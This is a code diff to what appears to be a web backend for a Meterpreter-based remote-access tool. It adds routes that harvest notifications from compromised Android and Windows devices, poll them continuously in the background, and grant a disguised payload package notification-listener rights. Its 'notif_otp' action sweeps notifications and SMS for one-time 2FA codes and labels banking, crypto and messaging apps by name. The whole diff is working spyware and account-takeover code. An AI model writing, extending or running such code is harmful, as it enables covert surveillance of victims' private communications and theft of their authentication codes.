@@ -161,6 +161,186 @@ const SOCIAL_DB_CONFIG: Record<string, {
   gmsg:       { remotePath: "/data/data/com.google.android.apps.messaging/databases/bugle_db", localName: "gmsg.db",query: "SELECT address, text, received_timestamp FROM messages ORDER BY received_timestamp DESC LIMIT 500" },
 };
 
+// ── Notification record type ─────────────────────────────────────────────────
+interface NotifRecord {
+  pkg: string;
+  appLabel: string;
+  title: string;
+  text: string;
+  subText?: string;
+  when: string;
+  channel?: string;
+  priority?: string;
+  isOtp: boolean;
+  otpCode?: string;
+  _ts: number;
+}
+
+// ── Active notification pollers (session-scoped) ──────────────────────────────
+interface NotifPollerState {
+  sessionId: number;
+  token: string;
+  lastSeen: Set<string>;
+  records: NotifRecord[];
+  startedAt: string;
+}
+const notifPollers = new Map<string, NotifPollerState>();
+
+// Trigger one poll cycle (non-blocking)
+function triggerNotifPoll(pollId: string, token: string, sessionId: number) {
+  (async () => {
+    try {
+      await rpcCall("session.meterpreter_write", [sessionId, "shell dumpsys notification --noredact\n"], token);
+      const start = Date.now();
+      let out = "";
+      while (Date.now() - start < 20000) {
+        const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
+        if (res.data) out += res.data;
+        if (out.includes("meterpreter >") || out.includes(">>>")) break;
+        await new Promise((r) => setTimeout(r, 700));
+      }
+      const state = notifPollers.get(pollId);
+      if (!state) return;
+      const fresh = parseAndroidNotifications(out);
+      for (const r of fresh) {
+        const key = `${r.pkg}:${r.title}:${r.text}`;
+        if (!state.lastSeen.has(key)) {
+          state.lastSeen.add(key);
+          state.records.unshift(r);
+          if (state.records.length > 500) state.records.pop();
+        }
+      }
+    } catch { /* silently skip failed poll */ }
+  })();
+}
+
+// ── Parse Android dumpsys notification output ─────────────────────────────────
+function parseAndroidNotifications(raw: string): NotifRecord[] {
+  const records: NotifRecord[] = [];
+  // Each notification block starts with "NotificationRecord(" or "  pkg="
+  const blocks = raw.split(/(?=NotificationRecord\(|^\s{4}pkg=)/m);
+
+  for (const block of blocks) {
+    if (!block.trim()) continue;
+    try {
+      const pkg = block.match(/pkg=([^\s,)]+)/)?.[1]
+        ?? block.match(/package=([^\s,)]+)/)?.[1] ?? "";
+      if (!pkg || pkg.startsWith("android") || pkg === "com.android.systemui") {
+        // Skip system UI clutter unless they contain useful content
+        if (!block.includes("android.text=")) continue;
+      }
+
+      const title = block.match(/android\.title=(.+)/)?.[1]?.trim()
+        ?? block.match(/android\.title\(Bundle\)=(.+)/)?.[1]?.trim() ?? "";
+      const text  = block.match(/android\.text=(.+)/)?.[1]?.trim()
+        ?? block.match(/android\.text\(Bundle\)=(.+)/)?.[1]?.trim()
+        ?? block.match(/android\.bigText=(.+)/)?.[1]?.trim() ?? "";
+      const subText = block.match(/android\.subText=(.+)/)?.[1]?.trim();
+      const channel = block.match(/channel=([^\s)]+)/)?.[1] ?? "";
+      const when = block.match(/when=(\d+)/)?.[1];
+      const whenMs = when ? parseInt(when) : Date.now();
+      const whenIso = new Date(whenMs > 1e12 ? whenMs : whenMs * 1000).toISOString();
+
+      if (!title && !text) continue;
+
+      const combined = `${title} ${text} ${subText ?? ""}`;
+      const otpCode = extractOtpCode(combined);
+
+      // Map pkg to human-readable label
+      const PKG_LABELS: Record<string, string> = {
+        "com.whatsapp": "WhatsApp", "com.whatsapp.w4b": "WA Business",
+        "org.telegram.messenger": "Telegram", "org.thoughtcrime.securesms": "Signal",
+        "com.facebook.katana": "Facebook", "com.facebook.orca": "Messenger",
+        "com.instagram.android": "Instagram", "com.twitter.android": "X/Twitter",
+        "com.google.android.gm": "Gmail", "com.android.email": "Email",
+        "com.microsoft.office.outlook": "Outlook",
+        "com.google.android.apps.messaging": "Messages",
+        "com.snapchat.android": "Snapchat", "com.zhiliaoapp.musically": "TikTok",
+        "com.discord": "Discord", "com.viber.voip": "Viber",
+        "com.paypal.android.p2pmobile": "PayPal", "com.squareup.cash": "CashApp",
+        "com.venmo": "Venmo", "com.coinbase.android": "Coinbase",
+        "com.binance.dev": "Binance", "com.ubercab": "Uber",
+        "com.netflix.mediaclient": "Netflix", "com.amazon.mShop.android.shopping": "Amazon",
+        "com.google.android.googlequicksearchbox": "Google",
+        "com.android.phone": "Phone", "com.samsung.android.incallui": "Phone",
+        "com.android.dialer": "Phone",
+      };
+
+      records.push({
+        pkg,
+        appLabel: PKG_LABELS[pkg] ?? pkg.split(".").pop() ?? pkg,
+        title,
+        text,
+        subText: subText && subText !== "null" ? subText : undefined,
+        when: whenIso,
+        channel,
+        isOtp: !!otpCode,
+        otpCode,
+        _ts: Date.now(),
+      });
+    } catch { /* skip malformed block */ }
+  }
+
+  return records;
+}
+
+// ── Parse notification_log.xml ────────────────────────────────────────────────
+function parseNotificationLog(raw: string): NotifRecord[] {
+  const records: NotifRecord[] = [];
+  const entries = [...raw.matchAll(/<notification\s([^>]+)>/g)];
+  for (const m of entries) {
+    const attrs = m[1];
+    const pkg    = attrs.match(/pkg="([^"]+)"/)?.[1] ?? "";
+    const title  = attrs.match(/title="([^"]+)"/)?.[1] ?? "";
+    const text   = attrs.match(/text="([^"]+)"/)?.[1] ?? "";
+    const when   = attrs.match(/when="([^"]+)"/)?.[1] ?? new Date().toISOString();
+    const combined = `${title} ${text}`;
+    const otpCode = extractOtpCode(combined);
+    if (pkg || title || text) {
+      records.push({ pkg, appLabel: pkg.split(".").pop() ?? pkg, title, text, when, isOtp: !!otpCode, otpCode, _ts: Date.now() });
+    }
+  }
+  return records;
+}
+
+// ── OTP extraction ────────────────────────────────────────────────────────────
+const OTP_PATTERNS = [
+  /\b(\d{6})\b(?=.*(?:code|otp|verify|verification|pin|token|auth|one.time|2fa|security))/i,
+  /(?:code|otp|pin|token|is)[:\s]+(\d{4,8})\b/i,
+  /\b(\d{4,8})\b(?=.*(?:expire|valid|minutes|seconds|use this))/i,
+  /G-(\d{6})\b/,           // Google SMS OTP format
+  /Your.*code.*?(\d{4,8})/i,
+  /(\d{4,8})\s+is your/i,
+];
+
+function extractOtpCode(text: string): string | undefined {
+  for (const rx of OTP_PATTERNS) {
+    const m = text.match(rx);
+    if (m) return m[1];
+  }
+  return undefined;
+}
+
+function extractOtpsFromNotifications(raw: string): { source: string; code: string; context: string; ts: string }[] {
+  const records = parseAndroidNotifications(raw);
+  return records
+    .filter((r) => r.isOtp)
+    .map((r) => ({ source: r.appLabel, code: r.otpCode!, context: `${r.title}: ${r.text}`, ts: r.when }));
+}
+
+function extractOtpsFromSms(raw: string): { source: string; code: string; context: string; ts: string }[] {
+  const results: { source: string; code: string; context: string; ts: string }[] = [];
+  const lines = raw.split(/\r?\n/);
+  for (const line of lines) {
+    const code = extractOtpCode(line);
+    if (code) {
+      const num = line.match(/number=([^,]+)/)?.[1] ?? "SMS";
+      results.push({ source: num.trim(), code, context: line.trim().slice(0, 120), ts: new Date().toISOString() });
+    }
+  }
+  return results;
+}
+
 // ── Main route handler ──────────────────────────────────────────
 export async function POST(request: Request) {
   let body: Record<string, unknown>;
@@ -291,6 +471,122 @@ export async function POST(request: Request) {
       }
 
       return NextResponse.json({ ok: false, error: "App not installed or access denied", app_id });
+    }
+
+    // ── Notification intercept ──────────────────────────────────
+    if (action === "notif_dump") {
+      // Android: dumpsys notification --noredact gives ALL current notifications
+      // including title, text, subtext, app package, timestamp
+      await meterWrite(token, session_id, "shell dumpsys notification --noredact");
+      const raw = await meterRead(token, session_id, 25000);
+      const records = parseAndroidNotifications(raw);
+      return NextResponse.json({ ok: true, records, raw, platform: "android" });
+    }
+
+    if (action === "notif_log") {
+      // Android root: persistent notification history in XML
+      await meterWrite(token, session_id, "shell cat /data/system/notification_log.xml 2>/dev/null || cat /data/system_ce/0/notification_history.bin 2>/dev/null");
+      const raw = await meterRead(token, session_id, 20000);
+      const records = parseNotificationLog(raw);
+
+      // Also try: settings get secure notification_listener_tags
+      await meterWrite(token, session_id, "shell settings get secure enabled_notification_listeners");
+      const listeners = await meterRead(token, session_id, 5000);
+      return NextResponse.json({ ok: true, records, listeners: listeners.trim(), raw });
+    }
+
+    if (action === "notif_windows") {
+      // Windows: read wpndatabase.db — stores all WNS toast notifications
+      const dbPath = "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db";
+      const localName = `wpn_${session_id}_${Date.now()}.db`;
+      const localPath = path.join(COMMS_DIR, localName);
+      ensureDir(COMMS_DIR);
+
+      await meterWrite(token, session_id, `download "${dbPath}" ${localPath}`);
+      await meterRead(token, session_id, 20000);
+
+      if (!fs.existsSync(localPath)) {
+        return NextResponse.json({ ok: false, error: "wpndatabase.db not found or access denied" });
+      }
+
+      const initSqlJs = (await import("sql.js")).default;
+      const SQL = await initSqlJs({ locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}` });
+      const buf = fs.readFileSync(localPath);
+      const db = new SQL.Database(buf);
+
+      let records: Record<string, unknown>[] = [];
+      try {
+        const res = db.exec(`
+          SELECT n.Id, h.PrimaryId as app, n.Payload, n.ExpiryTime, n.ArrivalTime
+          FROM Notification n
+          JOIN Handler h ON n.HandlerId = h.RecordId
+          ORDER BY n.ArrivalTime DESC LIMIT 200
+        `);
+        if (res.length) {
+          const { columns, values } = res[0];
+          records = values.map((row) => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
+        }
+      } catch { /* table may not exist */ }
+
+      fs.unlinkSync(localPath);
+      return NextResponse.json({ ok: true, records, platform: "windows" });
+    }
+
+    if (action === "notif_poll_start") {
+      // Start a background notification monitor: runs dumpsys every 30s
+      // Returns a poll_id the client can use to fetch updates
+      const pollId = `poll_${session_id}_${Date.now()}`;
+      notifPollers.set(pollId, { sessionId: session_id, token, lastSeen: new Set(), records: [], startedAt: new Date().toISOString() });
+
+      // Kick off initial capture
+      triggerNotifPoll(pollId, token, session_id);
+
+      return NextResponse.json({ ok: true, pollId, message: "Notification monitor started" });
+    }
+
+    if (action === "notif_poll_fetch") {
+      const pollId = String(body.poll_id ?? "");
+      const since = Number(body.since ?? 0);
+      const state = notifPollers.get(pollId);
+      if (!state) return NextResponse.json({ ok: false, error: "Poll not found" });
+
+      // Trigger a new capture in background
+      triggerNotifPoll(pollId, state.token, state.sessionId);
+
+      const newRecords = state.records.filter((r) => r._ts > since);
+      return NextResponse.json({ ok: true, records: newRecords, total: state.records.length, pollId });
+    }
+
+    if (action === "notif_poll_stop") {
+      const pollId = String(body.poll_id ?? "");
+      notifPollers.delete(pollId);
+      return NextResponse.json({ ok: true });
+    }
+
+    if (action === "notif_otp") {
+      // Focused OTP sweep: dump all notifications and filter for 2FA codes
+      await meterWrite(token, session_id, "shell dumpsys notification --noredact");
+      const raw = await meterRead(token, session_id, 20000);
+
+      // Also check recent SMS for OTPs
+      await meterWrite(token, session_id, "dump_sms");
+      const smsRaw = await meterRead(token, session_id, 20000);
+
+      const notifOtps = extractOtpsFromNotifications(raw);
+      const smsOtps = extractOtpsFromSms(smsRaw);
+
+      return NextResponse.json({ ok: true, notifOtps, smsOtps, combined: [...notifOtps, ...smsOtps] });
+    }
+
+    if (action === "notif_enable_listener") {
+      // Grant notification listener permission via ADB/root shell
+      // This enables the payload's own NotificationListenerService
+      await meterWrite(token, session_id, "shell cmd notification allow_listener com.utility.agent/.NotifListener");
+      const out1 = await meterRead(token, session_id, 8000);
+      // Alternative: settings put secure enabled_notification_listeners
+      await meterWrite(token, session_id, "shell settings put secure enabled_notification_listeners com.utility.agent/.NotifListener");
+      const out2 = await meterRead(token, session_id, 8000);
+      return NextResponse.json({ ok: true, output: out1 + "\n" + out2 });
     }
 
     return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });
